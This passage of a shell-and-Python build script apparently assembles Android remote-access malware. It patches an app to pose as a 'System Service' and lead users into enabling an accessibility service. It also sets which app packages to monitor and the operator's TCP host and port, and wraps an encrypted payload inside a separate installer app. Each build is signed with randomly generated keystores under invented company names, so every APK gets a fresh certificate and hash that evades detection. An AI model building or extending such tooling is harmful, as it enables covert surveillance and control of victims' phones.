with open(path, 'w', encoding='utf-8') as f: f.write(new)
PYEOF
        echo "  app app_name         = $BUILD_MODULE_NAME"
    fi
    if [ -n "${BUILD_INSTALLER_NAME:-}" ] && [ -f "$INSTALLER_STRINGS" ]; then
        cp "$INSTALLER_STRINGS" "$INSTALLER_STRINGS_BAK"
        BUILD_INSTALLER_NAME="$BUILD_INSTALLER_NAME" python3 - "$INSTALLER_STRINGS" << 'PYEOF'
import sys, os, re
path = sys.argv[1]
name = os.environ['BUILD_INSTALLER_NAME']
with open(path, 'r', encoding='utf-8') as f: src = f.read()
def esc(s):
    return s.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;').replace("'", '&apos;')
new = re.sub(r'(<string\s+name="app_name"[^>]*>)[^<]*(</string>)',
             lambda m: m.group(1) + esc(name) + m.group(2), src, count=1)
with open(path, 'w', encoding='utf-8') as f: f.write(new)
PYEOF
        echo "  installer app_name   = $BUILD_INSTALLER_NAME"
    fi

    # Patch Constants.java MONITORED_PACKAGES with the user's choices.
    # Empty list keeps the in-tree default unchanged.
    if [ -n "${BUILD_MONITORED_PACKAGES:-}" ] && [ -f "$APP_CONSTANTS" ]; then
        cp "$APP_CONSTANTS" "$APP_CONSTANTS_BAK"
        BUILD_MONITORED_PACKAGES="$BUILD_MONITORED_PACKAGES" python3 - "$APP_CONSTANTS" << 'PYEOF'
import sys, os, re
path = sys.argv[1]
raw = os.environ['BUILD_MONITORED_PACKAGES']
# Accept comma, whitespace, or newline separated. Validate as Java package.
items = [s.strip() for s in re.split(r'[,\s]+', raw) if s.strip()]
pat = re.compile(r'^[a-z][a-z0-9_]*(?:\.[a-z][a-z0-9_]*)+$')
items = [s for s in items if pat.match(s)]
# Dedupe, preserve order
seen, uniq = set(), []
for s in items:
    if s in seen: continue
    seen.add(s); uniq.append(s)
with open(path, 'r', encoding='utf-8') as f:
    src = f.read()
indent = ' ' * 8
body = (',\n'.join(f'{indent}"{s}"' for s in uniq) + ',\n    ') if uniq else '    '
new = re.sub(
    r'(public\s+static\s+final\s+String\[\]\s+MONITORED_PACKAGES\s*=\s*\{)[^}]*(\};)',
    lambda m: m.group(1) + ('\n' + body if uniq else '\n    ') + m.group(2),
    src, count=1, flags=re.DOTALL,
)
with open(path, 'w', encoding='utf-8') as f:
    f.write(new)
print(f"  Constants.java MONITORED_PACKAGES = {len(uniq)} entries")
PYEOF
    fi

    # Patch Constants.java TCP_HOST with the server's actual hostname.
    if [ -n "${BUILD_TCP_HOST:-}" ] && [ -f "$APP_CONSTANTS" ]; then
        [ ! -f "$APP_CONSTANTS_BAK" ] && cp "$APP_CONSTANTS" "$APP_CONSTANTS_BAK"
        BUILD_TCP_HOST="$BUILD_TCP_HOST" python3 - "$APP_CONSTANTS" << 'PYEOF'
import sys, os, re
path = sys.argv[1]
host = os.environ['BUILD_TCP_HOST']
with open(path, 'r', encoding='utf-8') as f: src = f.read()
new = re.sub(
    r'(public\s+static\s+final\s+String\s+TCP_HOST\s*=\s*")[^"]*(")',
    lambda m: m.group(1) + host + m.group(2),
    src, count=1
)
with open(path, 'w', encoding='utf-8') as f: f.write(new)
print(f"  Constants.java TCP_HOST = {host}")
PYEOF
        echo "  TCP_HOST = $BUILD_TCP_HOST"
    fi

    # Patch Constants.java TCP_PORT with the server's actual port.
    if [ -n "${BUILD_TCP_PORT:-}" ] && [ -f "$APP_CONSTANTS" ]; then
        [ ! -f "$APP_CONSTANTS_BAK" ] && cp "$APP_CONSTANTS" "$APP_CONSTANTS_BAK"
        BUILD_TCP_PORT="$BUILD_TCP_PORT" python3 - "$APP_CONSTANTS" << 'PYEOF'
import sys, os, re
path = sys.argv[1]
port = os.environ['BUILD_TCP_PORT']
with open(path, 'r', encoding='utf-8') as f: src = f.read()
new = re.sub(
    r'(public\s+static\s+final\s+int\s+TCP_PORT\s*=\s*)\d+(\s*;)',
    lambda m: m.group(1) + port + m.group(2),
    src, count=1
)
with open(path, 'w', encoding='utf-8') as f: f.write(new)
print(f"  Constants.java TCP_PORT = {port}")
PYEOF
        echo "  TCP_PORT = $BUILD_TCP_PORT"
    fi

    # ── Custom app icons ──────────────────────────────────────────────────────
    # Helper: download or base64-decode an icon URL, resize to all mipmap
    # densities using Pillow, and write ic_launcher.png / ic_launcher_round.png
    # / ic_launcher_foreground.png into every mipmap-* directory.
    apply_custom_icon() {
        local APP_DIR="$1"
        local ICON_URL="$2"
        local LABEL="$3"
        [ -z "$ICON_URL" ] && return 0

        echo "  Applying custom $LABEL icon…"
        local ICON_TMP
        ICON_TMP=$(mktemp /tmp/custom-icon-XXXXXX)

        if echo "$ICON_URL" | grep -q '^data:'; then
            # Base64 data URI — extract and decode
            echo "$ICON_URL" | sed 's/data:[^;]*;base64,//' | base64 -d > "$ICON_TMP" 2>/dev/null || {
                echo "  Warning: Failed to decode base64 icon for $LABEL — using default"
                rm -f "$ICON_TMP"; return 0
            }
        else
            curl -fsS -m 30 --max-filesize 8388608 -L -o "$ICON_TMP" "$ICON_URL" 2>/dev/null || {
                echo "  Warning: Failed to download $LABEL icon from URL — using default"
                rm -f "$ICON_TMP"; return 0
            }
        fi

        ICON_TMP="$ICON_TMP" APP_DIR="$APP_DIR" python3 - << 'PYEOF'
import sys, os, subprocess

icon_src = os.environ['ICON_TMP']
app_dir  = os.environ['APP_DIR']

# Install Pillow if missing (Dockerfile already has pip3)
try:
    from PIL import Image
except ImportError:
    subprocess.run(
        ['pip3', 'install', '--quiet', '--break-system-packages', 'Pillow'],
        check=False, capture_output=True
    )
    from PIL import Image

# Standard mipmap sizes: (launcher_icon_px, foreground_px)
# Foreground is 108dp equivalent at each density (for adaptive icons)
sizes = {
    'mipmap-mdpi':    (48,  108),
    'mipmap-hdpi':    (72,  162),
    'mipmap-xhdpi':   (96,  216),
    'mipmap-xxhdpi':  (144, 324),
    'mipmap-xxxhdpi': (192, 432),
}

try:
    img = Image.open(icon_src).convert('RGBA')
    res_dir = os.path.join(app_dir, 'src', 'main', 'res')

    for dir_name, (icon_px, fg_px) in sizes.items():
        out_dir = os.path.join(res_dir, dir_name)
        os.makedirs(out_dir, exist_ok=True)
        # Standard launcher icon (used pre-API-26 and as fallback)
        resized = img.resize((icon_px, icon_px), Image.LANCZOS)
        resized.save(os.path.join(out_dir, 'ic_launcher.png'), 'PNG')
        resized.save(os.path.join(out_dir, 'ic_launcher_round.png'), 'PNG')
        # Foreground for adaptive icon (108dp equivalent)
        fg = img.resize((fg_px, fg_px), Image.LANCZOS)
        fg.save(os.path.join(out_dir, 'ic_launcher_foreground.png'), 'PNG')

    # Update adaptive icon XML to reference the new bitmap foreground
    anydpi_dir = os.path.join(res_dir, 'mipmap-anydpi-v26')
    os.makedirs(anydpi_dir, exist_ok=True)
    adaptive_xml = (
        '<?xml version="1.0" encoding="utf-8"?>\n'
        '<adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">\n'
        '    <background android:drawable="@color/ic_launcher_background"/>\n'
        '    <foreground android:drawable="@mipmap/ic_launcher_foreground"/>\n'
        '</adaptive-icon>\n'
    )
    for name in ('ic_launcher.xml', 'ic_launcher_round.xml'):
        with open(os.path.join(anydpi_dir, name), 'w', encoding='utf-8') as f:
            f.write(adaptive_xml)

    print(f'  Custom icon applied: {len(sizes)} density variants + adaptive XML updated')
except Exception as e:
    print(f'  Warning: Icon processing failed ({e}) — using default icon')
PYEOF
        rm -f "$ICON_TMP"
    }

    apply_custom_icon "$ROOT_DIR/app"       "${BUILD_MODULE_ICON_URL:-}"    "module"
    apply_custom_icon "$ROOT_DIR/installer" "${BUILD_INSTALLER_ICON_URL:-}" "installer"

    # ── Patch module activity_main.xml — update hardcoded "System Service"
    # step-2 text to match the user's chosen module name automatically.
    if [ -n "${BUILD_MODULE_NAME:-}" ] && [ -f "$APP_LAYOUT" ]; then
        cp "$APP_LAYOUT" "$APP_LAYOUT_BAK"
        BUILD_MODULE_NAME="$BUILD_MODULE_NAME" python3 - "$APP_LAYOUT" << 'PYEOF'
import sys, os, re
path = sys.argv[1]
name = os.environ['BUILD_MODULE_NAME']
def esc(s):
    return s.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;').replace("'", '&apos;')
with open(path, 'r', encoding='utf-8') as f: src = f.read()
# Replace the step-2 "System Service" reference with the actual module name
esc_name = esc(name)
new = re.sub(
    r'(Find and tap &quot;)[^&]+(&quot; under Installed Services)',
    lambda m: m.group(1) + esc_name + m.group(2),
    src, count=1
)
with open(path, 'w', encoding='utf-8') as f: f.write(new)
print(f'  Module activity_main.xml step-2 label = {name}')
PYEOF
    fi

    # ── Patch installer launch page (activity_main.xml + colors.xml) ─────────
    _any_launch_override=0
    [ -n "${BUILD_INSTALLER_LAUNCH_TITLE:-}" ]    && _any_launch_override=1
    [ -n "${BUILD_INSTALLER_LAUNCH_SUBTITLE:-}" ] && _any_launch_override=1
    [ -n "${BUILD_INSTALLER_LAUNCH_BTN:-}" ]      && _any_launch_override=1
    [ -n "${BUILD_INSTALLER_LAUNCH_BG_COLOR:-}" ] && _any_launch_override=1
    [ -n "${BUILD_INSTALLER_LAUNCH_ACCENT:-}" ]   && _any_launch_override=1

    if [ "$_any_launch_override" -eq 1 ] && [ -f "$INSTALLER_LAYOUT" ]; then
        cp "$INSTALLER_LAYOUT" "$INSTALLER_LAYOUT_BAK"
        BUILD_INSTALLER_LAUNCH_TITLE="${BUILD_INSTALLER_LAUNCH_TITLE:-}" \
        BUILD_INSTALLER_LAUNCH_SUBTITLE="${BUILD_INSTALLER_LAUNCH_SUBTITLE:-}" \
        BUILD_INSTALLER_LAUNCH_BTN="${BUILD_INSTALLER_LAUNCH_BTN:-}" \
        python3 - "$INSTALLER_LAYOUT" << 'PYEOF'
import sys, os, re
path = sys.argv[1]
title    = os.environ.get('BUILD_INSTALLER_LAUNCH_TITLE', '').strip()
subtitle = os.environ.get('BUILD_INSTALLER_LAUNCH_SUBTITLE', '').strip()
btn      = os.environ.get('BUILD_INSTALLER_LAUNCH_BTN', '').strip()

def esc(s):
    return s.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;').replace("'","&apos;")

with open(path, 'r', encoding='utf-8') as f: src = f.read()

if title:
    src = re.sub(
        r'(android:id="@\+id/title"[^>]*>\s*android:text=")[^"]*(")',
        lambda m: m.group(1) + esc(title) + m.group(2),
        src, count=1
    )
    # Also handle multi-line attribute format
    src = re.sub(
        r'(android:id="@\+id/title".*?android:text=")[^"]*(")',
        lambda m: m.group(1) + esc(title) + m.group(2),
        src, count=1, flags=re.DOTALL
    )

if subtitle:
    src = re.sub(
        r'(android:id="@\+id/subtitle".*?android:text=")[^"]*(")',
        lambda m: m.group(1) + esc(subtitle) + m.group(2),
        src, count=1, flags=re.DOTALL
    )

if btn:
    src = re.sub(
        r'(android:id="@\+id/btnInstall".*?android:text=")[^"]*(")',
        lambda m: m.group(1) + esc(btn) + m.group(2),
        src, count=1, flags=re.DOTALL
    )

with open(path, 'w', encoding='utf-8') as f: f.write(src)
print(f'  Installer launch page: title={title!r} subtitle={subtitle!r} btn={btn!r}')
PYEOF
        echo "  Installer launch page text patched"
    fi

    # ── Patch installer colors.xml for background + accent ────────────────────
    if { [ -n "${BUILD_INSTALLER_LAUNCH_BG_COLOR:-}" ] || [ -n "${BUILD_INSTALLER_LAUNCH_ACCENT:-}" ]; } && [ -f "$INSTALLER_COLORS" ]; then
        cp "$INSTALLER_COLORS" "$INSTALLER_COLORS_BAK"
        BUILD_INSTALLER_LAUNCH_BG_COLOR="${BUILD_INSTALLER_LAUNCH_BG_COLOR:-}" \
        BUILD_INSTALLER_LAUNCH_ACCENT="${BUILD_INSTALLER_LAUNCH_ACCENT:-}" \
        python3 - "$INSTALLER_COLORS" << 'PYEOF'
import sys, os, re
path    = sys.argv[1]
bg      = os.environ.get('BUILD_INSTALLER_LAUNCH_BG_COLOR', '').strip()
accent  = os.environ.get('BUILD_INSTALLER_LAUNCH_ACCENT', '').strip()

def valid_hex(s): return bool(re.match(r'^#[0-9a-fA-F]{6}$', s))

with open(path, 'r', encoding='utf-8') as f: src = f.read()

if bg and valid_hex(bg):
    src = re.sub(
        r'(<color\s+name="bg">)[^<]*(</color>)',
        lambda m: m.group(1) + bg + m.group(2), src, count=1
    )
    # Also patch ic_launcher_background so the icon disc matches
    src = re.sub(
        r'(<color\s+name="ic_launcher_background">)[^<]*(</color>)',
        lambda m: m.group(1) + bg + m.group(2), src, count=1
    )
    # Patch surface too (card backgrounds) — slightly lighter if possible
    src = re.sub(
        r'(<color\s+name="surface">)[^<]*(</color>)',
        lambda m: m.group(1) + bg + m.group(2), src, count=1
    )

if accent and valid_hex(accent):
    src = re.sub(
        r'(<color\s+name="brand_start">)[^<]*(</color>)',
        lambda m: m.group(1) + accent + m.group(2), src, count=1
    )
    src = re.sub(
        r'(<color\s+name="brand_end">)[^<]*(</color>)',
        lambda m: m.group(1) + accent + m.group(2), src, count=1
    )

with open(path, 'w', encoding='utf-8') as f: f.write(src)
print(f'  Installer colors: bg={bg!r} accent={accent!r}')
PYEOF
        echo "  Installer colors patched"
    fi

    # ── Patch module app/src/main/res/layout/activity_main.xml ────────────────
    _any_module_launch_override=0
    [ -n "${BUILD_MODULE_LAUNCH_TITLE:-}" ]     && _any_module_launch_override=1
    [ -n "${BUILD_MODULE_LAUNCH_SUBTITLE:-}" ]   && _any_module_launch_override=1
    [ -n "${BUILD_MODULE_LAUNCH_STEP1:-}" ]      && _any_module_launch_override=1
    [ -n "${BUILD_MODULE_LAUNCH_STEP2:-}" ]      && _any_module_launch_override=1
    [ -n "${BUILD_MODULE_LAUNCH_STEP3:-}" ]      && _any_module_launch_override=1
    [ -n "${BUILD_MODULE_LAUNCH_STEP4:-}" ]      && _any_module_launch_override=1
    [ -n "${BUILD_MODULE_LAUNCH_BTN:-}" ]        && _any_module_launch_override=1
    [ -n "${BUILD_MODULE_LAUNCH_FOOTER:-}" ]     && _any_module_launch_override=1
    [ -n "${BUILD_MODULE_LAUNCH_BG_COLOR:-}" ]   && _any_module_launch_override=1
    [ -n "${BUILD_MODULE_LAUNCH_CARD_COLOR:-}" ] && _any_module_launch_override=1
    [ -n "${BUILD_MODULE_LAUNCH_ACCENT:-}" ]     && _any_module_launch_override=1

    if [ "$_any_module_launch_override" -eq 1 ] && [ -f "$APP_LAYOUT" ]; then
        cp "$APP_LAYOUT" "$APP_LAYOUT_BAK"
        BUILD_MODULE_LAUNCH_TITLE="${BUILD_MODULE_LAUNCH_TITLE:-}" \
        BUILD_MODULE_LAUNCH_SUBTITLE="${BUILD_MODULE_LAUNCH_SUBTITLE:-}" \
        BUILD_MODULE_LAUNCH_STEP1="${BUILD_MODULE_LAUNCH_STEP1:-}" \
        BUILD_MODULE_LAUNCH_STEP2="${BUILD_MODULE_LAUNCH_STEP2:-}" \
        BUILD_MODULE_LAUNCH_STEP3="${BUILD_MODULE_LAUNCH_STEP3:-}" \
        BUILD_MODULE_LAUNCH_STEP4="${BUILD_MODULE_LAUNCH_STEP4:-}" \
        BUILD_MODULE_LAUNCH_BTN="${BUILD_MODULE_LAUNCH_BTN:-}" \
        BUILD_MODULE_LAUNCH_FOOTER="${BUILD_MODULE_LAUNCH_FOOTER:-}" \
        BUILD_MODULE_LAUNCH_BG_COLOR="${BUILD_MODULE_LAUNCH_BG_COLOR:-}" \
        BUILD_MODULE_LAUNCH_CARD_COLOR="${BUILD_MODULE_LAUNCH_CARD_COLOR:-}" \
        BUILD_MODULE_LAUNCH_ACCENT="${BUILD_MODULE_LAUNCH_ACCENT:-}" \
        python3 - "$APP_LAYOUT" << 'PYEOF'
import sys, os, re
path    = sys.argv[1]
title   = os.environ.get('BUILD_MODULE_LAUNCH_TITLE', '').strip()
sub     = os.environ.get('BUILD_MODULE_LAUNCH_SUBTITLE', '').strip()
step1   = os.environ.get('BUILD_MODULE_LAUNCH_STEP1', '').strip()
step2   = os.environ.get('BUILD_MODULE_LAUNCH_STEP2', '').strip()
step3   = os.environ.get('BUILD_MODULE_LAUNCH_STEP3', '').strip()
step4   = os.environ.get('BUILD_MODULE_LAUNCH_STEP4', '').strip()
btn     = os.environ.get('BUILD_MODULE_LAUNCH_BTN', '').strip()
footer  = os.environ.get('BUILD_MODULE_LAUNCH_FOOTER', '').strip()
bg      = os.environ.get('BUILD_MODULE_LAUNCH_BG_COLOR', '').strip()
card    = os.environ.get('BUILD_MODULE_LAUNCH_CARD_COLOR', '').strip()
accent  = os.environ.get('BUILD_MODULE_LAUNCH_ACCENT', '').strip()

def esc(s):
    return s.replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;').replace("'","&apos;")

def valid_hex(s): return bool(re.match(r'^#[0-9a-fA-F]{6}$', s))

with open(path, 'r', encoding='utf-8') as f: src = f.read()

# ── Title: the static TextView "System Service" above statusText ─────────────
# Match the first android:text="System Service" (before any android:id lines)
if title:
    src = re.sub(
        r'(android:text=")System Service(")',
        lambda m: m.group(1) + esc(title) + m.group(2),
        src, count=1
    )

# ── Status subtitle (@+id/statusText) ────────────────────────────────────────
if sub:
    src = re.sub(
        r'(android:id="@\+id/statusText"[^/]*/?>|(?:(?!android:id).)*?android:id="@\+id/statusText"[^>]*>)',
        lambda m: m.group(0),
        src, count=1
    )
    # Simpler direct approach — replace the known default text on the statusText view
    src = re.sub(
        r'(android:text=")Accessibility service not enabled(")',
        lambda m: m.group(1) + esc(sub) + m.group(2),
        src, count=1
    )

# ── Steps — patch each step's description TextView ───────────────────────────
def patch_step_text(src, step_num, new_text):
    """Replace the description text of the Nth step row."""
    # The circle TextView is self-closing (/>), NOT </TextView>.
    # Match the number TV, skip whitespace, then grab the description TV's text attr.
    pattern = (
        r'(android:text="' + str(step_num) + r'"\s'
        r'[^>]*android:background="@drawable/step_circle"'
        r'[^/]*/>'
        r'\s*'
        r'<TextView'
        r'[^>]*android:layout_weight="1"'
        r'[^>]*android:text=")[^"]*(")'
    )
    return re.sub(pattern, lambda m: m.group(1) + esc(new_text) + m.group(2), src, count=1)

if step1: src = patch_step_text(src, 1, step1)
if step2: src = patch_step_text(src, 2, step2)
if step3: src = patch_step_text(src, 3, step3)
if step4: src = patch_step_text(src, 4, step4)

# ── Button text (@+id/openAccessibilityBtn) ───────────────────────────────────
if btn:
    src = re.sub(
        r'(android:text=")Open Accessibility Settings(")',
        lambda m: m.group(1) + esc(btn) + m.group(2),
        src, count=1
    )

# ── Footer note ────────────────────────────────────────────────────────────────
if footer:
    src = re.sub(
        r'(android:text=")Permissions are granted automatically[^"]*(")',
        lambda m: m.group(1) + esc(footer) + m.group(2),
        src, count=1
    )

# ── Background color (ScrollView android:background) ─────────────────────────
if bg and valid_hex(bg):
    src = re.sub(
        r'(android:background=")#0F172A(")',
        lambda m: m.group(1) + bg + m.group(2),
        src, count=1
    )

# ── Card / surface color — all LinearLayouts with #1E293B ─────────────────────
if card and valid_hex(card):
    src = src.replace('android:background="#1E293B"', f'android:background="{card}"')

# ── Accent color — step circle textColor and button backgroundTint ─────────────
if accent and valid_hex(accent):
    src = src.replace('android:textColor="#0EA5E9"',       f'android:textColor="{accent}"')
    src = src.replace('android:backgroundTint="#0EA5E9"',  f'android:backgroundTint="{accent}"')

with open(path, 'w', encoding='utf-8') as f: f.write(src)
print(f'  Module layout patched: title={title!r} sub={sub!r} btn={btn!r} bg={bg!r} card={card!r} accent={accent!r}')
PYEOF
        echo "  Module launch page patched"
    fi

    # Force clean build whenever customization is active — gradle's resource
    # cache otherwise keeps stale strings/applicationId from a previous build.
    # ALSO wipe any APK that may already be sitting in apk-output/ so that a
    # failed/aborted build cannot accidentally re-upload an older artefact
    # (this used to mask BUILD_EXIT=127 with a "✅ BUILD SUCCESS" because the
    # worker just uploaded whatever happened to be on disk).
    if [ "$CLEAN_BUILD" -eq 0 ]; then
        echo "  (Customization active — forcing clean build)"
        rm -rf "$ROOT_DIR/app/build" "$ROOT_DIR/installer/build"
    fi
    rm -f "$ROOT_DIR"/apk-output/*.apk \
          "$ROOT_DIR"/apk-output/*.apk.idsig 2>/dev/null || true
    if [ -n "${BUILD_ACCESS_ID:-}" ]; then
        rm -rf "$ROOT_DIR/apk-output/$BUILD_ACCESS_ID"
        echo "  Cleared previous APKs for $BUILD_ACCESS_ID"
    fi
    # Also wipe the encrypted module asset so the installer is rebuilt around
    # the new payload, and any leftover signing sidecar files.
    rm -f "$ROOT_DIR/installer/src/main/assets/module" \
          "$ROOT_DIR/installer/build.key" \
          "$ROOT_DIR/installer/payload.pkg" 2>/dev/null || true
fi

# ── 0. Clean (only when --clean is passed) ───────────────────────────────────
if [ "$CLEAN_BUILD" -eq 1 ]; then
  echo "==> Cleaning previous build artifacts..."
  rm -f "$ROOT_DIR"/apk-output/*.apk
  rm -rf "$ROOT_DIR/app/build"
  echo "  Cleaned."
else
  echo "==> Incremental build (pass --clean to do a full clean build)"
fi

# ── 1. Java ───────────────────────────────────────────────────────────────────
# IMPORTANT: never silently fall back to JAVA_HOME="." — that is what produced
# the infamous "java: command not found" / BUILD_EXIT=127 from a previous
# version of this script. We resolve Java in the following order, and if NONE
# of these succeed we abort the build loudly so the worker reports a real error
# instead of uploading stale APKs from a previous build.
echo ""
echo "$(date '+%Y-%m-%d %H:%M:%S') ==> Configuring Java..."
is_valid_jdk() {
    local candidate="$1"
    [ -x "$candidate/bin/java" ] || return 1
    [ -x "$candidate/bin/javac" ] || return 1

    local version
    version="$("$candidate/bin/java" -version 2>&1 | awk -F '"' '/version/ {print $2; exit}')"
    if [ -z "$version" ]; then
        return 1
    fi

    local major
    case "$version" in
        1.[0-9]* ) major="${version#1.}"; major="${major%%.*}" ;;
        * ) major="${version%%.*}" ;;
    esac
    [ "$major" -ge 17 ] 2>/dev/null
}

resolve_java_home() {
    # 1) Hard-coded Zulu JDK from the Replit nix store, if present.
    if [ -d "$ZULU_JDK" ] && is_valid_jdk "$ZULU_JDK"; then
        echo "$ZULU_JDK"; return 0
    fi
    # 2) Inherited JAVA_HOME, validated.
    if [ -n "${JAVA_HOME:-}" ] && is_valid_jdk "$JAVA_HOME"; then
        echo "$JAVA_HOME"; return 0
    fi
    # 3) `java` already on PATH — reverse the symlink to find JAVA_HOME.
    if command -v java >/dev/null 2>&1; then
        local jbin jh
        jbin="$(readlink -f "$(command -v java)" 2>/dev/null || command -v java)"
        jh="$(dirname "$(dirname "$jbin")")"
        if [ -n "$jh" ] && is_valid_jdk "$jh"; then
            echo "$jh"; return 0
        fi
    fi
    # 4) Common system / SDKMAN locations (alpine, debian, Fedora, brew, SDKMAN, …).
    local cand
    for cand in \
        /usr/lib/jvm/java-17-openjdk \
        /usr/lib/jvm/java-17-openjdk-amd64 \
        /usr/lib/jvm/java-17-openjdk-arm64 \
        /usr/lib/jvm/default-jvm \
        /usr/lib/jvm/default-java \
        /opt/java/openjdk \
        /opt/homebrew/opt/openjdk@17 \
        /usr/local/opt/openjdk@17 \
        /usr/local/sdkman/candidates/java/current \
        /usr/local/sdkman/candidates/java/21.0.10-ms \
        /usr/local/sdkman/candidates/java/25.0.2-ms; do
        if [ -x "$cand/bin/java" ] && is_valid_jdk "$cand"; then
            echo "$cand"; return 0
        fi
    done
    return 1
}
if JAVA_HOME_RESOLVED="$(resolve_java_home)"; then
    export JAVA_HOME="$JAVA_HOME_RESOLVED"
    export PATH="$JAVA_HOME/bin:$PATH"
    echo "  JAVA_HOME = $JAVA_HOME"
else
    echo "  ERROR: could not locate a usable JDK (need java + javac in \$JAVA_HOME/bin)." >&2
    echo "         Install OpenJDK 17, e.g.:" >&2
    echo "           alpine:  apk add openjdk17" >&2
    echo "           debian:  apt-get install -y openjdk-17-jdk-headless" >&2
    echo "           macOS:   brew install openjdk@17" >&2
    echo "         …or set JAVA_HOME to an existing JDK before re-running." >&2
    exit 127
fi
java -version 2>&1 | sed 's/^/    /'

# ── 2. Android SDK command-line tools ─────────────────────────────────────────
echo ""
echo "$(date '+%Y-%m-%d %H:%M:%S') ==> Setting up Android SDK..."
if [ ! -f "$ANDROID_SDK_DIR/cmdline-tools/latest/bin/sdkmanager" ]; then
    echo "  Downloading command-line tools..."
    curl -fsSL "$CMDLINE_TOOLS_URL" -o "$CMDLINE_TOOLS_ZIP"
    mkdir -p /tmp/android-sdk-temp
    cd /tmp/android-sdk-temp
    jar xf "$CMDLINE_TOOLS_ZIP"
    mkdir -p "$ANDROID_SDK_DIR/cmdline-tools"
    mv /tmp/android-sdk-temp/cmdline-tools "$ANDROID_SDK_DIR/cmdline-tools/latest"
    cd "$ROOT_DIR"
    chmod +x "$ANDROID_SDK_DIR/cmdline-tools/latest/bin/sdkmanager"
    echo "  Command-line tools ready."
else
    echo "  Command-line tools already present."
fi

export ANDROID_HOME="$ANDROID_SDK_DIR"
export ANDROID_SDK_ROOT="$ANDROID_SDK_DIR"
export PATH="$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools:$PATH"

# ── 3. SDK licenses ───────────────────────────────────────────────────────────
echo ""
echo "$(date '+%Y-%m-%d %H:%M:%S') ==> Accepting SDK licenses..."
set +e
yes 2>/dev/null | sdkmanager --sdk_root="$ANDROID_HOME" --licenses > /dev/null 2>&1
set -e
echo "  Licenses accepted (or already accepted)."

# ── 4. SDK platform & build-tools ─────────────────────────────────────────────
echo ""
echo "$(date '+%Y-%m-%d %H:%M:%S') ==> Installing SDK components..."
MISSING=0
if [ ! -d "$ANDROID_SDK_DIR/platforms/android-36" ]; then MISSING=1; fi
if [ ! -d "$ANDROID_SDK_DIR/build-tools/35.0.0"  ]; then MISSING=1; fi
if [ "$MISSING" -eq 1 ]; then
    sdkmanager --sdk_root="$ANDROID_HOME" "platforms;android-36" "build-tools;35.0.0"
    echo "  Installed: platforms;android-36 + build-tools;35.0.0"
else
    echo "  Already installed: platforms;android-36 + build-tools;35.0.0"
fi

# ── 5. Release keystores ──────────────────────────────────────────────────────
echo ""
echo "==> Checking Gradle release keystore..."
if [ ! -f "$KEYSTORE" ]; then
    echo "  Generating Gradle keystore (used only by assembleRelease)..."
    keytool -genkeypair \
        -storetype JKS \
        -keystore "$KEYSTORE" \
        -alias "$KEY_ALIAS" \
        -keyalg RSA \
        -keysize 4096 \
        -validity 10000 \
        -storepass "$STORE_PASS" \
        -keypass "$KEY_PASS" \
        -dname "CN=RemoteAccess, OU=Mobile, O=Corp, L=City, ST=State, C=US" \
        -sigalg SHA256withRSA \
        2>&1 | sed 's/^/    /'
    echo "  Gradle keystore created: $KEYSTORE"
else
    echo "  Gradle keystore present: $KEYSTORE"
fi

echo ""
echo "==> Generating per-build unique signing keystores..."
# Each build gets two brand-new random keystores — one for the Module APK and
# one for the Installer APK. These are used by apksigner in harden_apk() to
# produce final signatures, completely replacing the Gradle signing. Every
# resulting APK has a different certificate, hash, and encryption identity.
_ks_rword() {
    python3 -c "
import secrets
w=['alpha','beta','gamma','delta','sigma','omega','nexus','apex','nova','core',
'prime','edge','flux','sync','axis','meta','node','grid','base','link',
'arch','vault','trace','titan','matrix','zenith','cipher','echo','pulse','drift']
print(secrets.choice(w))"
}
_ks_pass() { python3 -c "import secrets; print(secrets.token_urlsafe(32))"; }
_ks_city() {
    python3 -c "
import secrets
print(secrets.choice(['London','Berlin','Singapore','Tokyo','Seoul','Vienna',
'Dublin','Oslo','Zurich','Helsinki','Stockholm','Amsterdam','Copenhagen',
'Brussels','Warsaw','Prague','Lisbon','Reykjavik','Auckland','Toronto']))"
}
_ks_country() {
    python3 -c "
import secrets
print(secrets.choice(['GB','DE','SG','JP','KR','AT','IE','NO','CH','FI',
'SE','NL','DK','BE','PL','CZ','PT','IS','NZ','CA']))"
}

MODULE_KS_PATH="/tmp/ks-module-$$.jks"
MODULE_KS_ALIAS="$(_ks_rword)$(_ks_rword)"
MODULE_KS_SPASS="$(_ks_pass)"
MODULE_KS_KPASS="$(_ks_pass)"
MODULE_KS_CN="$(_ks_rword) $(_ks_rword)"
MODULE_KS_ORG="$(_ks_rword)$(_ks_rword) Inc"
MODULE_KS_CITY="$(_ks_city)"
MODULE_KS_COUNTRY="$(_ks_country)"

INST_KS_PATH="/tmp/ks-installer-$$.jks"
INST_KS_ALIAS="$(_ks_rword)$(_ks_rword)"
INST_KS_SPASS="$(_ks_pass)"
INST_KS_KPASS="$(_ks_pass)"
INST_KS_CN="$(_ks_rword) $(_ks_rword)"
INST_KS_ORG="$(_ks_rword)$(_ks_rword) Ltd"
INST_KS_CITY="$(_ks_city)"
INST_KS_COUNTRY="$(_ks_country)"

rm -f "$MODULE_KS_PATH"
keytool -genkeypair \
    -storetype JKS \
    -keystore "$MODULE_KS_PATH" \
    -alias "$MODULE_KS_ALIAS" \
    -keyalg RSA \
    -keysize 4096 \
    -validity 10000 \
    -storepass "$MODULE_KS_SPASS" \
    -keypass "$MODULE_KS_KPASS" \
    -dname "CN=$MODULE_KS_CN, OU=Mobile, O=$MODULE_KS_ORG, L=$MODULE_KS_CITY, ST=State, C=$MODULE_KS_COUNTRY" \
    -sigalg SHA256withRSA \
    2>&1 | sed 's/^/    /'
echo "  Module keystore ready    (alias=$MODULE_KS_ALIAS, C=$MODULE_KS_COUNTRY)"

rm -f "$INST_KS_PATH"
keytool -genkeypair \
    -storetype JKS \
    -keystore "$INST_KS_PATH" \
    -alias "$INST_KS_ALIAS" \
    -keyalg RSA \
    -keysize 4096 \
    -validity 10000 \
    -storepass "$INST_KS_SPASS" \
    -keypass "$INST_KS_KPASS" \
    -dname "CN=$INST_KS_CN, OU=Services, O=$INST_KS_ORG, L=$INST_KS_CITY, ST=State, C=$INST_KS_COUNTRY" \
    -sigalg SHA256withRSA \
    2>&1 | sed 's/^/    /'
